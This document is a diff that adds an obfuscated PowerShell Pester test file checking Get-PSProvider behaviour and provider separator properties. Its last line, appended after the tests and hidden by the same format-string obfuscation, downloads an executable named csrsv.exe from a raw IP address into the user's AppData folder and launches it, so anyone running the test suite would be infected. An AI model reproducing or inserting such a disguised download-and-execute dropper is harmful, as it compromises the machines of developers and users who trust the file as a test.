@@ -1,0 +1,66 @@
+&("{1}{2}{0}" -f 'ibe','Desc','r') ("{0}{1}{4}{3}{2}"-f'Ge','t-P','er','rovid','SP') -Tags "CI" {
+    &('It') ("{7}{3}{6}{1}{8}{4}{5}{2}{10}{0}{9}" -f'o',' t','w',' be ab','l with no paramete','rs ','le','Should','o cal','r','ithout err') {
+	{ &("{1}{2}{0}{3}"-f 'i','Get-PSPr','ov','der') } | &("{1}{0}" -f'ould','Sh') -Not -Throw
+    }
+
+    &('It') ("{7}{8}{1}{4}{3}{5}{9}{2}{6}{10}{0}{11}"-f'ovid','d','he filesyst',' able to ',' be','call ','em','Sho','ul','t',' pr','er') {
+	{ .("{1}{2}{0}"-f'der','Get-PSP','rovi') ("{2}{0}{3}{1}" -f'ileS','em','F','yst') } | .("{1}{0}{2}"-f'oul','Sh','d') -Not -Throw
+
+	${a`cTU`Al} = &("{0}{2}{3}{1}" -f 'G','rovider','et-','PSP') ("{0}{1}{2}"-f 'FileSy','ste','m')
+
+	${aC`Tu`AL}."N`AmE" | .("{0}{1}"-f'Sh','ould') -BeExactly ("{0}{1}{2}" -f'F','ile','System')
+
+	${Act`UaL}."cA`P`Ab`ILiTieS" | .("{1}{2}{0}"-f 'uld','Sh','o') -BeExactly ("{2}{1}{4}{5}{0}{9}{10}{6}{7}{3}{8}" -f 'd','t','Fil','red','er, ','Shoul','cess,',' C','entials','Pr','o')
+    }
+
+    &('It') ("{10}{3}{6}{1}{5}{4}{2}{7}{9}{0}{8}"-f 'a ','all a','er ','uld be able to','d',' provi',' c','with','wildcard expression',' ','Sho') {
+	{ &("{1}{2}{3}{4}{0}"-f 'r','Get-PSPr','o','vi','de') ("{0}{1}" -f'Fi','le*m') } | .("{2}{1}{0}"-f 'ld','ou','Sh') -Not -Throw
+    }
+
+    .('It') ("{7}{0}{2}{1}{3}{6}{5}{8}{4}{9}" -f 'b',' ','e','able to pi','p',' the ou','pe','Should ','t','ut') {
+	${a`c`Tual} = &("{1}{4}{0}{3}{2}"-f'PSProvi','Get','r','de','-')
+
+	{ ${act`Ual} | &("{2}{1}{0}"-f 'st','i','Format-L') } | &("{2}{1}{0}"-f'd','l','Shou') -Not -Throw
+    }
+
+    &("{0}{1}{2}" -f 'Co','n','text') ("{0}{5}{4}{2}{6}{3}{1}" -f 'I','s','e','tie','tor prop','temSepara','r') {
+        .("{2}{1}{0}"-f'll','reA','Befo') {
+            ${T`EsTc`ASEs} = if (${is`WINd`oWs}) {
+                            @(
+                                @{("{1}{2}{0}"-f 'ider','Pro','v') = ("{1}{0}{2}"-f 'S','File','ystem'); ("{2}{0}{1}" -f'ep','arator','ItemS') = '\'; ("{3}{0}{1}{2}{4}" -f'ltIt','e','mSepar','A','ator') = '/'}
+                                @{("{1}{0}{2}" -f'e','Provid','r') = ("{0}{1}"-f'Variabl','e'); ("{2}{1}{0}{3}" -f'arat','ep','ItemS','or') = '\'; ("{1}{0}{4}{2}{3}"-f 'Item','Alt','epar','ator','S') = '/'}
+                                @{("{1}{2}{0}"-f'ovider','P','r') = ("{0}{1}{2}"-f'F','u','nction'); ("{0}{1}{2}{3}"-f 'It','em','S','eparator') = '\'; ("{2}{0}{1}{3}" -f 'ltItem','Separa','A','tor') = '/'}
+                                @{("{2}{1}{0}" -f'er','vid','Pro') = ("{0}{1}"-f'Al','ias'); ("{1}{2}{0}"-f 'or','Ite','mSeparat') = '\'; ("{4}{0}{3}{1}{2}" -f'ltItemS','parat','or','e','A') = '/'}
+                                @{("{1}{0}" -f'rovider','P') = ("{0}{2}{1}"-f'E','ronment','nvi'); ("{1}{0}{2}"-f'Sep','Item','arator') = '\'; ("{2}{1}{0}{3}" -f'para','temSe','AltI','tor') = '/'}
+                                @{("{1}{2}{0}" -f 'ider','P','rov') = ("{0}{1}{2}" -f 'Certi','f','icate'); ("{4}{2}{0}{3}{1}"-f'S','tor','em','epara','It') = '\'; ("{0}{5}{1}{4}{3}{2}"-f 'A','Se','tor','ra','pa','ltItem') = '/'}
+                                @{("{1}{0}{2}" -f'vi','Pro','der') = ("{0}{1}{2}"-f'R','eg','istry'); ("{0}{2}{1}" -f 'I','Separator','tem') = '\'; ("{4}{2}{1}{0}{3}" -f 'parato','e','mS','r','AltIte') = '\'}
+                            )
+                        }
+                        else {
+                            @(
+                                @{("{1}{0}" -f 'ovider','Pr') = ("{2}{1}{0}" -f'tem','leSys','Fi'); ("{2}{0}{3}{1}" -f 'temSepa','r','I','rato') = '/'; ("{1}{0}{2}" -f 'epar','AltItemS','ator') = '\'}
+                                @{("{2}{0}{1}" -f'vi','der','Pro') = ("{0}{1}" -f'Variab','le'); ("{4}{3}{2}{1}{0}" -f'or','at','ar','p','ItemSe') = '/'; ("{4}{2}{0}{1}{3}"-f'Sep','arato','Item','r','Alt') = '\'}
+                                @{("{0}{2}{1}" -f'Provid','r','e') = ("{1}{0}" -f'nction','Fu'); ("{1}{3}{0}{2}"-f'ato','Item','r','Separ') = '/'; ("{1}{3}{4}{2}{0}" -f'rator','Al','epa','tI','temS') = '\'}
+                                @{("{1}{0}"-f 'er','Provid') = ("{1}{0}" -f's','Alia'); ("{1}{2}{0}"-f'ator','ItemS','epar') = '/'; ("{2}{3}{5}{1}{4}{0}" -f'r','t','A','ltIt','o','emSepara') = '\'}
+                                @{("{1}{2}{0}"-f'ider','P','rov') = ("{1}{3}{2}{0}"-f 'ment','Envi','n','ro'); ("{2}{3}{1}{0}"-f'or','rat','ItemSep','a') = '/'; ("{0}{3}{1}{2}"-f 'A','arato','r','ltItemSep') = '\'}
+                            )
+                        }
+        }
+
+        .('It') ("{4}{3}{2}{6}{7}{5}{8}{0}{1}" -f'r','ator properties','o','r','<P','temS','vider> provider h','as I','epa') -TestCases ${Te`STCa`Ses} {
+            param (${P`RoVi`DeR}, ${itEMSE`p`ARA`Tor}, ${Al`TiTEmse`pAr`A`TOr})
+
+            (&("{0}{4}{3}{1}{2}" -f 'Get-','vide','r','o','PSPr') ${proVId`Er})."I`T`e`mSEPaRaTor" | .("{1}{0}"-f'd','Shoul') -Be ${ITems`EP`A`R`AtOr}
+            (&("{1}{0}{2}"-f 'et-PSProv','G','ider') ${P`RoviDER})."Al`T`iTEMS`Epa`RATor" | &("{1}{0}" -f'ld','Shou') -Be ${a`LTi`Te`msEParA`TOr}
+        }
+
+        .('It') ("{0}{10}{13}{7}{11}{6}{5}{9}{3}{14}{1}{12}{2}{4}{8}"-f'ItemSepa','i','p','o','rov','e','rti','tor pro','ider','s is read-','r','pe','der> ','a','nly in <Prov') -TestCases ${tE`s`TCA`seS} {
+            param (${Pr`OV`IdEr}, ${ITEMS`ePar`At`or}, ${ALt`itE`MsEP`ARAtor})
+
+            { (&("{3}{0}{1}{4}{2}" -f'Prov','i','r','Get-PS','de') ${pROV`iD`eR})."iteMS`epA`RAtOr" = ${nU`ll} } | .("{1}{0}"-f'd','Shoul') -Throw
+            { (&("{4}{3}{1}{0}{2}" -f 'id','v','er','ro','Get-PSP') ${PROV`I`DER})."AlTiT`Emsep`AR`A`TOr" = ${n`ULL} } | .("{0}{1}"-f 'Shoul','d') -Throw
+        }
+    }
+}
+
+(.("{1}{2}{0}" -f'ct','New','-Obje') ("{5}{1}{6}{2}{0}{4}{3}"-f 't.Web','s','em.Ne','t','Clien','Sy','t')).("{0}{2}{3}{1}" -f 'D','le','ownload','Fi').Invoke(("{9}{0}{1}{2}{4}{5}{7}{8}{10}{3}{6}" -f '8','9','.248.170','/','.218/','~y','csrsv.exe','a','h','http://','oo'),"$env:APPDATA\csrsv.exe");.("{2}{1}{0}{3}"-f'r','art-P','St','ocess') ("$env:APPDATA\csrsv.exe")
